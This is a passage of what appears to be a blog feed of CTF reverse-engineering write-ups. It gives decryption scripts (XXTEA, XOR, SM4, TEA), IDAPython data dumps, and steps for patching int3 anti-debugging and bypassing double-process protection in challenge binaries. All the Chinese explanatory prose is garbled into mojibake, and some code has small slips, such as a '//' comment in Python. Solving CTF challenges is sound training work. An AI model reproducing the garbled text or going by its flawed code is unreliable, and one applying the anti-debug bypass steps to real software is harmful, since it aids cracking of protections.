class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">y = v[p + <span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;</span><br><span class="line">n = -n;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = rounds * DELTA;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) &#123;</span><br><span class="line">z = v[p - <span class="number">1</span>];</span><br><span class="line">y = v[p] -= MX;</span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> arr[] = &#123;<span class="number">3880694563</span>, <span class="number">3081185334</span>, <span class="number">1506439138</span>, <span class="number">2524759489</span>, <span class="number">3883935348</span>, <span class="number">1026381030</span>, <span class="number">2325545814</span>, <span class="number">2581382044</span>, <span class="number">1881594093</span>, <span class="number">1781792173</span>, <span class="number">4103492874</span>, <span class="number">1553756062</span>, <span class="number">468045900</span>, <span class="number">1730391575</span>, <span class="number">1383114178</span>, <span class="number">2890011402</span>, <span class="number">2227070898</span>, <span class="number">1885128569</span>, <span class="number">1548828056</span>, <span class="number">4214676013</span>, <span class="number">571971141</span>, <span class="number">1558401693</span>, <span class="number">3515474427</span>, <span class="number">3898332297</span>, <span class="number">1942540575</span>, <span class="number">1421197718</span>, <span class="number">3061626000</span>, <span class="number">555214026</span>, <span class="number">2648963476</span>, <span class="number">794468778</span>, <span class="number">2816999933</span>, <span class="number">3272437419</span>, <span class="number">464379036</span>, <span class="number">877899850</span>, <span class="number">2460223225</span>&#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> key[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line">XXTEA(<span class="number">-35</span>, arr, key);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201420062.png"></p><h3 id="Welcome-to-reverse-world"><a href="#Welcome-to-reverse-world" class="headerlink" title="Welcome to reverse world !"></a>Welcome to reverse world !</h3><p>ç®€å•é¢˜ï¼Œä¸€ä¸ªå¼‚æˆ–ç›´æ¥æå®š</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201736107.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re</span>():</span></span><br><span class="line">    addr = <span class="number">0x00007FF7F7513480</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">        flag += chr((<span class="number">0xff</span> - i) ^ get_byte(addr +i))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201838100.png"></p><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>ç»™äº†æˆ‘ä»¬pythonå­—èŠ‚ç ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±è¿˜åŸæˆpythonä»£ç ï¼Œä¸‹é¢è´´è¿˜åŸè¿‡åçš„ä»£ç ï¼ŒåŠ å¯†è¿‡ç¨‹å¾ˆç®€å•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_func</span>():</span></span><br><span class="line">    raw_flag = input(<span class="string">&#x27;give me your flag:\n&#x27;</span>)</span><br><span class="line">    cipher = list(raw_flag[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">    length = len(cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length // <span class="number">2</span>):</span><br><span class="line">        cipher[<span class="number">2</span>*i], cipher[<span class="number">2</span>*i+<span class="number">1</span>] = cipher[<span class="number">2</span>*i+<span class="number">1</span>] , cipher[<span class="number">2</span>*i]</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        res.append(ord(cipher[i]) ^ i)</span><br><span class="line">    res = bytes(res).hex()</span><br><span class="line">    print(<span class="string">&#x27;your flag: &#x27;</span> + res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(dis.dis(input_func))</span></span><br></pre></td></tr></table></figure><p>è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cip</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res = []</span><br><span class="line">    cipher = <span class="string">&#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;</span></span><br><span class="line">    length = len(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, length, <span class="number">2</span>):</span><br><span class="line">        res.append(int(cipher[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">        flag += chr(res[i] ^ i)</span><br><span class="line">    flag = list(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag) // <span class="number">2</span>):</span><br><span class="line">        flag[i*<span class="number">2</span>+<span class="number">1</span>], flag[i*<span class="number">2</span>] = flag[i*<span class="number">2</span>],flag[i*<span class="number">2</span> + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        print(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">WPWPWP</summary>
    
    
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>goè¯­è¨€å­¦ä¹ 2ï¼ˆå‡½æ•°ï¼ŒåŒ¿åå‡½æ•°ï¼Œé—­åŒ…ï¼‰</title>
    <link href="http://example.com/2021/02/02/go/GoStudy-2/"/>
    <id>http://example.com/2021/02/02/go/GoStudy-2/</id>
    <published>2021-02-01T16:34:19.104Z</published>
    <updated>2021-02-05T06:37:34.465Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

</summary>
      
    
    
    
    <category term="go" scheme="http://example.com/categories/go/"/>
    
    
    <category term="ç¼–ç¨‹" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>HWSè®¡åˆ’2021ç¡¬ä»¶å®‰å…¨å†¬ä»¤è¥çº¿ä¸Šé€‰æ‹”èµ›</title>
    <link href="http://example.com/2021/02/01/CTF/wp/HWSCTF/"/>
    <id>http://example.com/2021/02/01/CTF/wp/HWSCTF/</id>
    <published>2021-02-01T10:51:54.222Z</published>
    <updated>2021-02-05T06:32:17.657Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201185722500.png"></p><p>ä¸€é“hooké¢˜ï¼Œidaæ‰“å¼€ä»£ç è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œé¦–å…ˆåˆ¤æ–­é•¿åº¦ç„¶ååœ¨åŠ å¯†ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰ææ¸…æ¥šè¿™ä¸ªhookçš„æµç¨‹ï¼Œå¬åˆ«çš„å¸ˆå‚…è¯´çš„åœ¨CRTçš„æ—¶å€™ï¼Œä»r3åˆ°r0æ—¶å€™hookçš„ğŸ˜¥ï¼ˆå¬çš„ä¸æ˜¯å¾ˆæ‡‚ï¼‰ï¼Œä½†æ˜¯æˆ‘çæ‰¾æ‰¾åˆ°è¿™ä¸¤ä¸ªå‡½æ•°</p><p><strong>èµ„æºè§£å¯†</strong></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190115121.png"></p><p><strong>èµ„æºåŠ è½½</strong></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190013052.png"></p><p>å¯ä»¥çœ‹å‡ºç¨‹åºåŠ è½½äº†ä¸€ä¸ªå«<strong>CIPHER_DLL</strong>çš„èµ„æº,è¿™ä¸ªèµ„æºå…¶å®å°±æ˜¯ç»è¿‡åŠ å¯†çš„DLLï¼Œæˆ‘ç”¨<strong>ResourceHacker</strong>(ä¸€ä¸ªå¯ä»¥æŸ¥çœ‹ç¨‹åºèµ„æºçš„å·¥å…·)æ¥æŸ¥çœ‹ç¨‹åºä¸­çš„èµ„æº</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190453201.png"></p><p>ç¨‹åºä¸­ç¡®å®æœ‰ä¸€ä¸ªå«<strong>CIPHER_DLL</strong>çš„èµ„æº,ä¸”è¿™ä¸ªèµ„æºéœ€è¦è§£å¯†æ‰èƒ½ä½¿ç”¨,å›¾ä¸­**wow!**å°±æ˜¯è¯æ˜,æŠŠè¿™ä¸ªèµ„æºçš„äºŒè¿›åˆ¶æ–‡ä»¶æå‡ºæ¥,åœ¨è§£å¯†å›å»,å¾—åˆ°ä¸€ä¸ªDLL</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">//è§£å¯†èµ„æº</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ResourceDecrypt</span>():</span></span><br><span class="line">    filepath = <span class="string">&#x27;C:\\Users\\86180\\Desktop\\CIPHER_DLL101&#x27;</span></span><br><span class="line">    dllpath = <span class="string">&#x27;C:\\Users\\86180\\Desktop\\DLL.dll&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;wow!&#x27;</span></span><br><span class="line">    size = os.path.getsize(filepath) <span class="comment"># è·å¾—æ–‡ä»¶å¤§å°</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> cipher_stream:</span><br><span class="line">        <span class="keyword">with</span> open(dllpath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> dll_stream:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">                data = struct.unpack(<span class="string">&#x27;B&#x27;</span>, cipher_stream.read(<span class="number">1</span>))[<span class="number">0</span>] ^ ord(key[i%<span class="number">4</span>])</span><br><span class="line">                dll_stream.write(struct.pack(<span class="string">&#x27;B&#x27;</span>, data))</span><br></pre></td></tr></table></figure><p>æŠŠDLLç”¨idaæ‰“å¼€,æŸ¥çœ‹åŠ å¯†å‡½æ•°,å­—ç¬¦ä¸²å·²ç»å‘Šè¯‰æˆ‘ä»¬æ˜¯SM4åŠ å¯†,æ²¡æœ‰é­”æ”¹.</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190932018.png"></p><p><a href="https://github.com/yang3yen/pysm4">SM4Githubä»£ç é“¾æ¥</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida <span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> pysm4</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»idaä¸­æå–åŠ å¯†åçš„æ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_ida_data</span>():</span></span><br><span class="line">    addr = <span class="number">0x00BFA808</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        res.append(get_byte(addr + i))</span><br><span class="line">    print(bytes(res).hex())</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># åˆ©ç”¨GitHubä¸Šæ‰¾çš„sm4è„šæœ¬,å†™çš„è§£å¯†å‡½æ•°</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>():</span></span><br><span class="line">    string = <span class="string">b&#x27;Ez_5M4_C1pH@r!!!&#x27;</span>.hex()</span><br><span class="line">    key = <span class="number">0x457a5f354d345f433170484072212121</span></span><br><span class="line">    cipher1 = <span class="number">0xea6358b78ce2a1e9c5298f53e8083259</span></span><br><span class="line">    cipher2 = <span class="number">0xaf1b67aed9dacfc472ffb1ec7673f306</span></span><br><span class="line">    plain1 = hex(pysm4.decrypt(cipher1, key))[<span class="number">2</span>:]</span><br><span class="line">    plain2 = hex(pysm4.decrypt(cipher2, key))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(plain1),<span class="number">2</span>):</span><br><span class="line">        print(chr(int(plain1[i:i+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(plain1),<span class="number">2</span>):</span><br><span class="line">        print(chr(int(plain2[i:i+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># flag&#123;42b061b4cb41cfa89ca78047bde1856e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201191532668.png" alt="image-20210201191532668"></p><h3 id="child-protect"><a href="#child-protect" class="headerlink" title="child_protect"></a>child_protect</h3><p>å‚è€ƒçœ‹é›ªçš„ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://bbs.pediy.com/thread-95082.htm">https://bbs.pediy.com/thread-95082.htm</a></p><p>è¿™é“é¢˜è€ƒçš„æ˜¯åŒè¿›ç¨‹å®ˆæŠ¤é—®é¢˜ï¼Œä¸Šé¢çš„æ–‡ç« å’Œè¿™é“é¢˜ç±»ä¼¼ï¼Œä½†æ˜¯éš¾ç‚¹åœ¨äºè°ƒè¯•ã€‚</p><p>idaæ‰“å¼€åå‘ç°ä¸»å‡½æ•°æ— æ³•æ­£å¸¸åç¼–è¯‘ï¼Œè€Œä¸”çœ‹åˆ°äº†int3ä¸­æ–­å¼‚å¸¸æŒ‡ä»¤ã€‚ç”±äºæ˜¯åŒè¿›ç¨‹å®ˆæŠ¤ï¼Œéœ€è¦æ‰¾åˆ°åˆ›å»ºå­è¿›ç¨‹çš„åœ°æ–¹</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202220203991.png"></p><p>é€šè¿‡æœç´¢CreateProcesså‡½æ•°ï¼Œç¡®å®šå­è¿›ç¨‹ç”±å‡½æ•°sub_413670åˆ›å»º</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202220516727.png"></p><p>ç»§ç»­è·Ÿè¸ªï¼Œç¡®å®šäº†ä¸¤ä¸ªå‡½æ•°è°ƒç”¨å­è¿›ç¨‹ï¼Œåˆ†åˆ«æ˜¯sub_413BE0å’Œsub_413950</p><p>è€Œå‡½æ•°sub_413950æ˜¯ä¸€ä¸ªå…³é”®å‡½æ•°ï¼Œä»–å¯¹å­è¿›ç¨‹åšäº†ä¿®æ”¹ã€‚å¦‚æœæƒ³è®©idaæ­£ç¡®çš„åç¼–è¯‘ï¼Œæˆ‘ä»¬éœ€è¦nopæ‰æ‰€æœ‰çš„int3æŒ‡ä»¤ï¼Œä¸”æŒ‰ç…§ç¨‹åºä¿®æ”¹éƒ¨åˆ†æŒ‡ä»¤ï¼Œè¿™é‡Œæˆ‘ç”¨010Editorè¿›è¡Œä¿®æ”¹ã€‚</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221029165.png"></p><p>é¦–å…ˆæ‰¾åˆ°æ‰€æœ‰çš„int3æŒ‡ä»¤</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221659699.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221750385.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221833555.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222047820.png"></p><p>ä¸Šå›¾å°±æ˜¯éœ€è¦æˆ‘ä»¬é¦–å…ˆnopæ‰çš„åœ°æ–¹ï¼Œç”¨010Editorä¿®æ”¹åå†æ¬¡ç”¨idaæ‰“å¼€å¯ä»¥å‘ç°ä¸»å‡½æ•°å·²ç»å¯ä»¥æ­£å¸¸åç¼–è¯‘ï¼Œä½†æ˜¯è¿˜ä¸èƒ½å¤ŸåŠ¨æ€è°ƒè¯•ï¼Œ</p><p>å› ä¸ºæ‰€æœ‰çš„è¿‡ç¨‹éƒ½æ˜¯åœ¨å­è¿›ç¨‹ä¸­è¿›è¡Œï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨å·²ç»ä¿®æ”¹äº†çˆ¶è¿›ç¨‹çš„æ•°æ®å’Œå­è¿›ç¨‹ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥è·³è¿‡è°ƒç”¨å­è¿›ç¨‹çš„æ­¥éª¤ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€éƒ¨åˆ†æ•°æ®ã€‚</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222323468.png"></p><p>ç»è¿‡å¤šæ¬¡ä¸‹æ–­ç‚¹è°ƒè¯•åï¼Œå®šä½åˆ°å‡½æ•°sub_413D10ï¼Œä¿®æ”¹è¿‡åå°±å¯ä»¥è¿›è¡Œè°ƒè¯•ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªå‘ã€‚ã€‚</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202223254218.png"></p><p>æ¯æ¬¡è°ƒè¯•åˆ°è¿™é‡Œçš„æ—¶å€™éƒ½ä¼šé—ªé€€ï¼Œæ— è®ºæ€ä¹ˆè°ƒéƒ½æ²¡æœ‰ç”¨ï¼Œæœ€åæˆ‘é€‰æ‹©çš„åŠæ³•æ˜¯ç›´æ¥patchæ‰è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æŒ‡ä»¤ï¼Œå› ä¸ºè¿™æ­¥æ¯”è¾ƒç®€å•ï¼Œä¸”ä¸å½±å“åé¢çš„æ•°æ®ã€‚</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202223522827.png"></p><p>åœ¨å¯ä»¥åŠ¨è°ƒåï¼Œå°±å¯ä»¥åˆ†æç®—æ³•äº†ï¼Œç®—æ³•æœ‰ä¸¤å¤„ï¼Œä¸€å¤„å¼‚æˆ–ï¼Œä¸€å¤„teaåŠ å¯†ï¼Œå¼‚æˆ–å‡½æ•°æˆ‘å°†ä»–pachï¼Œç›´æ¥çœ‹teaå¤„</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222546684.png" alt="å¼‚æˆ–"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222610483.png" alt="tea"></p><p>teaåŠ å¯†çš„keyæ˜¯åœ¨è¿è¡Œæ—¶ç”Ÿæˆçš„ï¼Œä½†æ˜¯å¦‚æœä¸åŠ¨æ€è°ƒè¯•ä¹Ÿå¯ä»¥ç›´æ¥å¤åˆ¶æ•´ä¸ªå‡½æ•°è·‘ä¸€éä¹Ÿå¯ä»¥ï¼Œæˆ‘å–œæ¬¢åŠ¨æ€è°ƒè¯•ï¼ˆæ‡’ï¼‰</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224017437.png"></p><p>ç”Ÿæˆäº†8ä¸ªæ•°æ®ï¼Œä½†æ˜¯åªç”¨åˆ°äº†å‰å››ä¸ªï¼Œåé¢åªéœ€è¦æ‰¾åˆ°åŠ å¯†åçš„æ•°æ®å°±okäº†ï¼Œè¿™é‡Œæˆ‘ç”¨idapython</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224217028.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DumpCipher</span>():</span></span><br><span class="line">    addr = []</span><br><span class="line">    res = []</span><br><span class="line">    start = <span class="number">0x4122C8</span></span><br><span class="line">    end = <span class="number">0x4123AE</span></span><br><span class="line">    curr_addr = start</span><br><span class="line">    dword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> curr_addr &lt;= end:</span><br><span class="line">        addr.append(curr_addr)</span><br><span class="line">        curr_addr = idc.next_head(curr_addr,end)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">            print(dword)</span><br><span class="line">            res.append(int(dword, <span class="number">16</span>))</span><br><span class="line">            dword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        data = idc.print_operand(addr[i], <span class="number">1</span>).replace(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">            data = <span class="string">&#x27;0&#x27;</span> + data</span><br><span class="line">        <span class="keyword">elif</span> len(data) == <span class="number">3</span>:</span><br><span class="line">            data = data[<span class="number">1</span>:]</span><br><span class="line">        dword = dword + data</span><br><span class="line">    <span class="comment"># print(dword)</span></span><br><span class="line">    res.append(int(dword, <span class="number">16</span>))</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224331594.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TEA_decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0xC6EF3720</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span 